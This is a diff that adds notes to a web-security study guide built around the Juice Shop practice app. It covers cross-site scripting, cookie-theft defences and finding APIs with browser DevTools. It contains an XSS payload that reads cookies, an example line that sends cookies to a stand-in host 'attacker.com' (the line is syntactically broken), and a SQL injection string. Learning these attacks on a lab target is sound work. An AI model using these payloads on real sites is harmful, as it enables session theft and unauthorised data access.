@@ -78,3 +78,31 @@ popup appears
 - how browsers execute HTML + JS
 - how user input becomes dangerous
 - why sanitization matters
+# turn XSS into data exfiltration
+with cross-site scripting, attackers often:
+- steal cookies
+- steal tokens
+- send data to their own server
+## try to read cookies
+in the search bar, try:
+```html
+<img src=x onerror=alert(document.cookie)>
+```
+real attackers don't use `alert()`
+they do send cookies to the attack server, example:
+```html
+<img src="http://attacker.com/steal?c=" + document.cookie>
+```
+## measures against it
+- HttpOnly cookies (not accessible via JS)
+- Input sanitization
+- Output encoding
+# use DevTools to discover hidden APIs
+in real applications, the frontend talks to a backend via APIs, and many vulnerabilities are found there.
+## steps
+- open developer tools: in browser, press F12, go to the Network tab
+- filter requests: at the top, click "XHR" or "Fetch", this shows API calls only.
+- trigger APIs: go back to Juice Shop page and refresh the page OR search something OR log in/out
+- you should see a list of requests, click on one request, look at Headers (URL, Method(GET/POST)), response (JSON data returned).
+- if an API is a get request like `/rest/products/search?q=apple`:
+    - you can copy it in the DevTools and paste it in the browser and mortify it. like `/rest/products/search?q=' OR 1=1--`
